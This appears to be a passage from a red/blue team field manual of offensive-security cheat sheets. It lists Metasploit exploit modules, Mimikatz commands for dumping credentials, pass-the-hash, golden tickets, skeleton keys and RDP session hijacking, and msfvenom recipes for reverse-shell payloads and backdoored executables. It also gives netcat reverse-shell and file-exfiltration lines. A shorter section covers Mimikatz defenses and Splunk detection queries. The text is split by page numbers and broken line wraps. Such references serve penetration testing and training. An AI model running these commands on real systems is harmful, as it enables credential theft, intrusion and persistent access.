search  
Searches all exploits, payloads, 
and auxiliary modules 
show exploits 
Show all exploits 
show payloads 
Show all payloads 
show auxiliary 
Show all auxiliary modules (like 
scanners) 
show all 
* 
POPULAR MODULES/EXPLOITS 
use 
auxiliary/scanner/smb/smb_enu
mshares 
SMB Share Enumeration 
use 
auxiliary/scanner/smb/smb_ms1
7_010 
MS17-010 SMB RCE Detection 
use 
exploit/windows/smb/ms17_010_
eternalblue 
MS17-010 EternalBlue SMB Remote 
Windows Kernel Pool Corruption 
use 
exploit/windows/smb/ms17_010_
psexec 
MS17-010 
EternalRomance/EternalSynergy/Ete
rnalChampion SMB Remote Windows 
Code Execution 
use 
exploit/windows/smb/ms08_067_
netapi 
MS08-067 Microsoft Server Service 
Relative Path Stack Corruption 
use 
exploit/windows/smb/psexec 
Microsoft Windows Authenticated 
User Code Execution 
use exploit/multi/ssh/sshexec 
SSH User Code Execution (good for 
using meterpreter) 
use 
post/windows/gather/arp_scann
er 
Windows Gather ARP Scanner 
use 
post/windows/gather/enum_appl
ications 
Windows Gather Installed 
Application Enumeration 
run getgui -e 
Enables RDP for Windows in 
meterpreter session 
REFERENCE: 
https://www.tunnelsup.com/metasploit-cheat-sheet/ 
https://www.offensive-security.com/metasploit-unleashed/ 
https://nitesculucian.github.io/2018/12/01/metasploit-cheat-sheet/ 
https://medium.com/@nikosch86/how-to-metasploit-behind-a-nat-or-pivoting-
and-reverse-tunneling-with-meterpreter-1e747e7fa901 
202 
M
M 
MIMIKATZ 
RED TEAM 
ESCALATE PRIV 
WINDOWS 
Mimikatz is a leading post-exploitation tool that dumps passwords 
from memory, as well as hashes, PINs and Kerberos tickets. 
QUICK USAGE 
log 
privilege::debug 
SEKURLSA 
sekurlsa::logonpasswords 
sekurlsa::tickets /export 
sekurlsa::pth /user:Administrator /domain:winxp 
/ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd 
KERBEROS 
kerberos::list /export 
kerberos::ptt c:\chocolate.kirbi 
kerberos::golden /admin:administrator /domain:chocolate.local 
/sid:S-1-5-21-130452501-2365100805-3685010670 
/krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi 
CRYPTO 
crypto::capi 
crypto::cng 
crypto::certificates /export 
crypto::certificates /export 
/systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE 
crypto::keys /export 
crypto::keys /machine /export 
VAULT / LSADUMP 
vault::cred 
vault::list 
token::elevate 
vault::cred 
vault::list 
lsadump::sam 
lsadump::secrets 
lsadump::cache 
token::revert 
203 
lsadump::dcsync /user:domain\krbtgt /domain:lab.local 
COMMAND 
DESCRIPTION 
CRYPTO::Certificates 
list/export certificates 
CRYPTO::Certificates 
list/export certificates 
KERBEROS::Golden 
create golden/silver/trust tickets 
KERBEROS::List 
list all user tickets (TGT and TGS) in 
user memory. No special privileges 
required since it only displays the 
current user’s tickets.Similar to 
functionality of “klist”. 
KERBEROS::PTT 
pass the ticket. Typically used to 
inject a stolen or forged Kerberos 
ticket (golden/silver/trust). 
LSADUMP::DCSync 
ask a DC to synchronize an object (get 
password data for account). No need to 
run code on DC. 
LSADUMP::LSA 
Ask LSA Server to retrieve SAM/AD 
enterprise (normal, patch on the fly 
or inject). Use to dump all Active 
Directory domain credentials from a 
Domain Controller or lsass.dmp dump 
file. Also used to get specific 
account credential such as krbtgt with 
the parameter /name: “/name:krbtgt” 
LSADUMP::SAM 
get the SysKey to decrypt SAM entries 
(from registry or hive). The SAM 
option connects to the local Security 
Account Manager (SAM) database and 
dumps credentials for local accounts. 
This is used to dump all local 
credentials on a Windows computer. 
LSADUMP::Trust 
Ask LSA Server to retrieve Trust Auth 
Information (normal or patch on the 
fly). Dumps trust keys (passwords) for 
all associated trusts (domain/forest). 
MISC::AddSid 
Add to SIDHistory to user account. The 
first value is the target account and 
the second value is the account/group 
name(s) (or SID). Moved to SID:modify 
as of May 6th, 2016. 
MISC::MemSSP 
Inject a malicious Windows SSP to log 
locally authenticated credentials. 
MISC::Skeleton 
Inject Skeleton Key into LSASS process 
on Domain Controller. This enables all 
user authentication to the Skeleton 
Key patched DC to use a “master 
password” (aka Skeleton Keys) as well 
as their usual password. 
204 
PRIVILEGE::Debug 
get debug rights (this or Local System 
rights is required for many Mimikatz 
commands). 
SEKURLSA::Ekeys 
list Kerberos encryption keys 
SEKURLSA::Kerberos 
List Kerberos credentials for all 
authenticated users (including 
services and computer account) 
SEKURLSA::Krbtgt 
get Domain Kerberos service account 
(KRBTGT)password data 
SEKURLSA::LogonPasswords 
lists all available provider 
credentials. This usually shows 
recently logged on user and computer 
credentials. 
SEKURLSA::Pth 
Pass- theHash and Over-Pass-the-Hash 
SEKURLSA::Tickets 
Lists all available Kerberos tickets 
for all recently authenticated users, 
including services running under the 
context of a user account and the 
local computer’s AD computer account. 
Unlike kerberos::list, sekurlsa uses 
memory reading and is not subject to 
key export restrictions. sekurlsa can 
access tickets of others sessions 
(users). 
TOKEN::List 
list all tokens of the system 
TOKEN::Elevate 
impersonate a token. Used to elevate 
permissions to SYSTEM (default) or 
find a domain admin token on the box 
TOKEN::Elevate 
/domainadmin 
impersonate a token with Domain Admin 
credentials. 
Mimikatz - Execute commands 
SINGLE COMMAND 
PS C:\temp\mimikatz> .\mimikatz "privilege::debug" 
"sekurlsa::logonpasswords" exit 
MULTIPLE COMMANDS (Mimikatz console) 
PS C:\temp\mimikatz> .\mimikatz 
mimikatz # privilege::debug 
mimikatz # sekurlsa::logonpasswords 
mimikatz # sekurlsa::wdigest 
Mimikatz - Extract passwords 
**Microsoft disabled lsass clear text storage since Win8.1 / 
2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 
2008R2 / 2012 but clear text is still enabled. 
mimikatz_command -f sekurlsa::logonPasswords full 
mimikatz_command -f sekurlsa::wdigest 
205 
# to re-enable wdigest in Windows Server 2012+ 
# in 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProvide
rs\WDigest  
# create a DWORD 'UseLogonCredential' with the value 1. 
reg add 
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v 
UseLogonCredential /t REG_DWORD /f /d 1 
!!!!To take effect, conditions are required: 
Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2: 
        Adding requires lock 
        Removing requires signout 
Win10: 
        Adding requires signout 
        Removing requires signout 
Win2016: 
        Adding requires lock 
        Removing requires reboot 
Mimikatz - Pass-The-Hash 
sekurlsa::pth /user: /domain: 
/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c9409
8a9e9 
sekurlsa::pth /user: /domain: 
/ntlm:cc36cf7a8514893efccd332446158b1a 
/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c9409
8a9e9 
Mimikatz - Mini Dump 
Dump the lsass process. 
# HTTP method 
certutil -urlcache -split -f 
http://live.sysinternals.com/procdump.exe 
C:\Users\Public\procdump.exe 
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp 
# SMB method 
net use Z: https://live.sysinternals.com 
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp 
Then load it inside Mimikatz. 
mimikatz # sekurlsa::minidump lsass.dmp 
Switch to minidump 
mimikatz # sekurlsa::logonPasswords 
Mimikatz - Golden ticket 
206 
.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME 
/domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID 
/krbtgt:KRBTGTPASSWORDHASH /ptt 
Example 
.\mimikatz "kerberos::golden /admin:ADMINACCOUNTNAME 
/domain:DOMAINFQDN /id:9999 /sid:S-1-5-21-135380161-102191138-
581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 
/endin:600 /renewmax:10080 /ptt" exit 
Mimikatz - Skeleton key 
privilege::debug 
misc::skeleton 
# map the share 
net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz 
# login as someone 
rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab 
Mimikatz - RDP session takeover 
Run tscon.exe as the SYSTEM user, you can connect to any session 
without a password. 
privilege::debug  
token::elevate  
ts::remote /id:2  
# get the Session ID you want to hijack 
query user 
create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55" 
net start sesshijack 
Mimikatz - Credential Manager & DPAPI 
# check the folder to find credentials 
dir C:\Users\\AppData\Local\Microsoft\Credentials\* 
# check the file with mimikatz 
$ mimikatz dpapi::cred 
/in:C:\Users\\AppData\Local\Microsoft\Credentials\2647629
F5AA74CD934ECD2F88D64ECD0 
# find master key 
$ mimikatz !sekurlsa::dpapi 
# use master key 
$ mimikatz dpapi::cred 
/in:C:\Users\\AppData\Local\Microsoft\Credentials\2647629
F5AA74CD934ECD2F88D64ECD0 
/masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed50630432739
40f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b
6a17b 
207 
REFERENCE: 
https://github.com/gentilkiwi/mimikatz 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology
%20and%20Resources/Windows% 
https://adsecurity.org/?page_id=182120-%20Mimikatz.md 
https://pentestlab.blog/2018/04/10/skeleton-key/ 
M
M 
MIMIKATZ_Defend 
BLUE TEAM 
CONFIGURATION/HUNT 
WINDOWS 
Methods to defend against and detect mimikatz usage 
MIMIKATZ DEFENSE 
Disable Debug Permissions 
Allow only a certain group to have debug permissions: 
Group Policy Management Editor -> Windows Settings -> Security 
Settings -> Local Policies -> User Rights Assignment -> Debug 
programs -> Define these policy settings: 
Disable WDigest Protocol 
Don’t allow plaintext passwords in LSASS 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProvide
rs\WDigest 
UseLogonCredential DWORD 0 
Enable LSA Protection 
Create registry key RunAsPPL under: 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA 
RunAsPPL DWORD 1 
Restricted Admin Mode 
Create registry key DisableRestrictedAdmin 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa 
DWORD 0 
Create registry key DisableRestrictedAdminOutboundCreds 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa 
DWORD 1 
Ensure "Restrict delegation of credentials to remote servers" 
policy is enforced across the domain. "Require Restricted Admin" 
Change Credential Caching to 0 
Change the configuration settings to zero to disallow credential 
caching: 
208 
Computer Configuration -> Windows Settings -> Local Policy -> 
Security Options -> Interactive Logon: Number of previous logons to 
cache -> 0 
Enable Protected Users Group 
Group enables domain administrators to protect privilege users like 
Local Administrators. Accounts can be added into the “Protected 
Users” group from PowerShell by executing the following command: 
Add-ADGroupMember –Identity 'Protected Users' –Members Alice 
DETECT MIMIKATZ 
Sysmon Event 10 (Process Accessed)  
Splunk query similar to this: 
EventCode=10 | where (GrantedAccess="0x1010" AND TargetImage LIKE 
"%lsass.exe") 
Windows Event 4656  
Splunk query similar to this: 
EventCode=4656 OR EventCode=4663 | eval 
HandleReq=case(EventCode=4656 AND Object_Name LIKE "%lsass.exe" AND 
Access_Mask=="0x143A", Process_ID) | where (HandleReq=Process_ID) 
or  
EventCode=4656 | where (Object_Name LIKE "%lsass.exe" AND 
Access_Mask=="0x143A") 
Sysmon Event 1 (ProcessCreate) & Event 10 (ProcessAccessed) 
Elaborate a correlation rule 
SEQUENCE:  
1. EventCode=1 | where (match(ParentImage, "cmd.exe") AND 
match(IntegrityLevel, "high")) 
2. EventCode=10 | where (match(GrantedAccess, "0x1010") 
AND !match(SourceImage, "svchost\.exe") AND match(TargetImage, 
"lsass\.exe")) 
REFERENCE: 
https://www.eideon.com/2017-09-09-THL01-Mimikatz/ 
https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5 
M
M 
MSFVENOM 
RED TEAM 
PAYLOADS 
WINDOWS/LINUX/MacOS 
MsfVenom is a Metasploit standalone payload generator as a 
replacement for msfpayload and msfencode. 
BINARIES 
209 
msfvenom -p windows/meterpreter/reverse_tcp 
LHOST={IP} LPORT={##} -f exe > example.exe 
Creates a simple 
TCP Payload for 
Windows 
msfvenom -p windows/meterpreter/reverse_http 
LHOST={IP} LPORT={##} -f exe > example.exe 
Creates a simple 
HTTP Payload for 
Windows 
msfvenom -p 
linux/x86/meterpreter/reverse_tcp LHOST={IP} 
LPORT={##} -f elf > example.elf 
Creates a simple 
TCP Shell for 
Linux 
msfvenom -p osx/x86/shell_reverse_tcp 
LHOST={IP} LPORT={##} -f macho > 
example.macho 
Creates a simple 
TCP Shell for Mac 
msfvenom -p android/meterpreter/reverse/tcp 
LHOST={IP} LPORT={##} R > example.apk 
Creats a simple 
TCP Payload for 
Android 
WEB PAYLOAD 
msfvenom -p php/meterpreter_reverse_tcp 
LHOST={IP} LPORT={##} -f raw > example.php 
Creats a Simple 
TCP Shell for PHP 
msfvenom -p windows/meterpreter/reverse_tcp 
LHOST={IP} LPORT={##} -f asp > example.asp 
Creats a Simple 
TCP Shell for ASP 
msfvenom -p java/jsp_shell_reverse_tcp 
LHOST={IP} LPORT={##} -f raw > example.jsp 
Creats a Simple 
TCP Shell for 
Javascript 
msfvenom -p java/jsp_shell_reverse_tcp 
LHOST={IP} LPORT={##} -f war > example.war 
Creats a Simple 
TCP Shell for WAR 
WINDOWS PAYLOAD 
msfvenom -l encoders 
Lists all 
avalaible encoders 
msfvenom -x base.exe -k -p 
windows/meterpreter/reverse_tcp LHOST={IP} 
LPORT={##} -f exe > example.exe 
Binds an exe with 
a Payload 
(Backdoors an exe) 
msfvenom -p windows/meterpreter/reverse_tcp 
LHOST={IP} LPORT={##} -e x86/shikata_ga_nai 
-b ‘\x00’ -i 3 -f exe > example.exe 
Creates a simple 
TCP payload with 
shikata_ga_nai 
encoder 
msfvenom -x base.exe -k -p 
windows/meterpreter/reverse_tcp LHOST={IP} 
LPORT={##} -e x86/shikata_ga_nai -i 3 -b 
“\x00” -f exe > example.exe 
Binds an exe with 
a Payload and 
encodes it 
MACOS PAYLOAD 
msfvenom -a x86 --platform OSX -p 
osx/x86/isight/bind_tcp -b "\x00" -f elf -o 
/tmp/osxt2 
msfvenom -p python/meterpreter/reverse_tcp 
LHOST=10.0.0.4 LPORT=443 > pyterpreter.py 
Creates  a Python 
Shell for Mac 
msfvenom -p osx/x86/shell_reverse_tcp 
LHOST={IP} LPORT={##} -f macho > 
example.macho 
Creates a simple 
TCP Shell for Mac 
REFERENCE: 
210 
https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/ 
N 
N
N 
NETCAT 
RED/BLUE TEAM 
ADMINISTRATION 
WINDOWS/LINUX/MacOS 
netcat is a command-line or shell application that can be used for 
a variety of uses including transferring files, establishing remote 
shells, chat, and more! 
Port Scan 
nc -nvz   
nc -nvz 192.168.1.23 80 
nc -nvz 192.168.1.23 0-1000 
Send File 
#Client 
nc -lvp  > example_sent.txt 
#Server 
nc -w3      > example_exfil.txt 
Execute Remote Script 
211 
#Server 
nc -lvp  -e ping.sh  
#Client 
nc -nv   
Encrypted Chat (NCAT) 
#Server  
ncat -nlvp  --ssl 
#Client  
ncat -nv   
Banner Grab 
nc   
nc www.netmux.com 80 
HEAD / HTTP/1.0 
Host: www.netmux.com 
Shells/Reverse Shells 
nc -e /bin/sh 10.0.0.1  
nc -e /bin/bash 10.0.0.1  
nc -c bash 10.0.0.1  
N
N 
NETWORK DEVICE_Commands 
RED/BLUE TEAM 
NETWORK DEVICES 
4 MODELS 
CISCO 
JUNIPER 
NOKIA 
HUAWEI 
IOS XR 
JUNOS 
SROS 
HVRP 
BASIC 
show 
show 
show 
display 
exit 
exit/up 
exit all 
quit 
run 
run 
– 
– 
end 
exit 
exit all 
return 
| include 
| match 
| match 
| include 
… formal | 
| display-set 
– 
– 
reload 
request system 
reboot 
admin reboot 
now 
reboot 
GENERAL CONFIG 
show running-
config 
show 
configuration 
admin display-
config 
display 
current-
configuration 
show startup-
config 
– 
– 
display 
saved-
configuration 
212 
configure 
terminal 
configure / 
edit 
configure 
system view 
hostname 
hostname 
system host-
name  hostname 
system 
name  systemnam
e 
sysname  syst
emname 
show  (after 
conf change) 
show  | compare 
info (after 
conf change) 
– 
commit 
commit 
admin save 
save 
shut down 
disable 
shut down 
shut down 
no shut down 
delete 
interfaces x 
disable 
no shutdown 
undo shut 
down 
no 
delete 
no 
undo 
SHOW 
show clock 
show system 
uptime 
show system 